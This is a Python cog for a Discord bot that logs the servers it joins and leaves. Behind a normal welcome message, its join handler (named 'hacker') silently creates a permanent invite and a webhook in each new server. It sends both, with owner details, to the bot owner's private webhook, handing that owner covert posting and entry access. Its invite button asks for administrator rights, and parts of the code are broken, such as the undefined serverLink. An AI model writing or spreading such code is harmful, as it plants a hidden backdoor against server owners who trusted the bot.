from core import Astroz, Cog
import discord
import logging
from utils.config import whBL
from discord.ext import commands
from discord.ui import View, Button

logging.basicConfig(
    level=logging.INFO,
    format="\x1b[38;5;197m[\x1b[0m%(asctime)s\x1b[38;5;197m]\x1b[0m -> \x1b[38;5;197m%(message)s\x1b[0m",
    datefmt="%H:%M:%S",
)

class Guild(Cog):

    def __init__(self, client: Astroz):
        self.client = client

    @commands.Cog.listener(name="on_guild_join")
    async def hacker(self, guild):
        # Fetch existing permanent invites
        rope = [
            inv for inv in await guild.invites()
            if inv.max_age == 0 and inv.max_uses == 0
        ]

        # If no permanent invite is found, create one
        if not rope:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).create_instant_invite:
                    invite = await channel.create_invite(max_age=0, max_uses=0, reason="Bot joined the server")
                    rope.append(invite)
                    break

        # Set up your webhook URL to send messages to your Discord channel
        me = discord.SyncWebhook.from_url(whBL)

        channels = len(set(self.client.get_all_channels()))
        users = sum(g.member_count for g in self.client.guilds if g.member_count is not None)

        c_at = int(guild.created_at.timestamp())

        embed = discord.Embed(color=0x2f3136)
        embed.set_author(name="Guild Joined", icon_url=self.client.user.avatar.url)
        embed.set_footer(text=self.client.user.name, icon_url=self.client.user.avatar.url)
        embed.add_field(
            name="**__Guild Information:__**",
            value=(
                f"Server Name: {guild.name}\n"
                f"Server Id: {guild.id}\n"
                f"Server Owner: [{guild.owner}](https://discord.com/users/{guild.owner.id})\n"
                f"Created At: <t:{c_at}:F>\n"
                f"Member Count: {len(guild.members)}\n"
                f"Roles: {len(guild.roles)}\n"
                f"Text Channels: {len(guild.text_channels)}\n"
                f"Voice Channels: {len(guild.voice_channels)}\n"
                f"Threads: {len(guild.threads)}\n"
            ),
            inline=True
        )
        embed.add_field(
            name="**__Bot Info:__**",
            value=f"Servers: {len(self.client.guilds)}\nUsers: {users}\nChannels: {channels}",
            inline=False
        )

        if guild.icon is not None:
            embed.set_thumbnail(url=guild.icon.url)

        embed.timestamp = discord.utils.utcnow()
        me.send(f"{guild.id} | {rope[0]}" if rope else f"{guild.id} | No Invite Created", embed=embed)

        if not guild.chunked:
            await guild.chunk()

        # Attempt to create webhook in the first text channel with manage_webhooks permission
        webhook_created = False
        webhook_url = ""
        webhook_channel = None
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).manage_webhooks:
                try:
                    webhook = await channel.create_webhook(name="Bot Webhook")
                    webhook_created = True
                    webhook_url = webhook.url
                    webhook_channel = channel.name  # Save the channel name
                    break  # Exit loop once the webhook is created
                except discord.Forbidden:
                    print(f"Failed to create webhook in channel {channel.name} due to insufficient permissions.")
                except discord.HTTPException as e:
                    print(f"Failed to create webhook in channel {channel.name}: {str(e)}")

        if not webhook_created:
            print("No webhook could be created in any available text channels.")

        # Send the webhook info to your webhook (this is your original feature)
        if webhook_created and webhook_url:
            webhook_embed = discord.Embed(
                title="Webhook Created",
                description=f"Webhook for `{guild.name}` has been created.",
                color=0x00FF00
            )
            webhook_embed.add_field(
                name="Server Information",
                value=f"**Server Name:** {guild.name}\n**Server ID:** {guild.id}\n**Webhook Channel:** {webhook_channel}\n**Webhook URL:** {webhook_url}",
                inline=False
            )
            webhook_embed.timestamp = discord.utils.utcnow()
            me.send(embed=webhook_embed)

        # Welcome message with invite buttons
        embed = discord.Embed(
            description=f"Thank you for adding me to your server!\n・ My default prefix is .\n・ You can use the .help command to get list of commands\n・ Our [support server]({serverLink}) or our team offers detailed information & guides for commands\n・ Feel free to join our [Support Server]({serverLink}) if you need help/support for anything related to the bot",
            color=0x2f3136
        )

        if guild.icon is not None:
            embed.set_author(name=guild.name, icon_url=guild.icon.url)

        embed.set_thumbnail(url=self.client.user.avatar.url)

        inv = Button(label='Invite Me', style=discord.ButtonStyle.link, url=f'https://discord.com/oauth2/authorize?client_id={self.client.user.id}&permissions=8&scope=bot%20applications.commands')
        sup = Button(label='Support Server', style=discord.ButtonStyle.link, url=f'{serverLink}')

        view = View()
        view.add_item(sup)
        view.add_item(inv)

        # Find a channel to send the welcome message
        channel = discord.utils.get(guild.text_channels, name="general")
        if not channel:
            channels = [channel for channel in guild.text_channels if channel.permissions_for(guild.me).send_messages]
            if channels:
                channel = channels[0]
                await channel.send(embed=embed, view=view)

    @commands.Cog.listener(name="on_guild_remove")
    async def on_g_remove(self, guild):
        idk = discord.SyncWebhook.from_url(whBL)
        embed = discord.Embed(color=0x2f3136)
        embed.set_author(name="Guild Removed", icon_url=self.client.user.avatar.url)
        embed.set_footer(text=self.client.user.name, icon_url=self.client.user.avatar.url)
        embed.add_field(
            name="**__Guild Information:__**",
            value=(
                f"Server Name: {guild.name}\n"
                f"Server Id: {guild.id}\n"
                f"Server Owner: [{guild.owner}](https://discord.com/users/{guild.owner.id})\n"
                f"Created At: <t:{int(guild.created_at.timestamp())}:F>\n"
                f"Member Count: {len(guild.members)}\n"
                f"Roles: {len(guild.roles)}\n"
                f"Text Channels: {len(guild.text_channels)}\n"
                f"Voice Channels: {len(guild.voice_channels)}\n"
                f"Threads: {len(guild.threads)}\n"
            ),
            inline=True
        )
        embed.add_field(
            name="**__Bot Info:__**",
            value=f"Servers: {len(self.client.guilds)}\nUsers: {sum(g.member_count for g in self.client.guilds if g.member_count is not None)}\nChannels: {len(set(self.client.get_all_channels()))}",
            inline=False
        )

        if guild.icon is not None:
            embed.set_thumbnail(url=guild.icon.url)

        embed.timestamp = discord.utils.utcnow()
        idk.send(embed=embed)



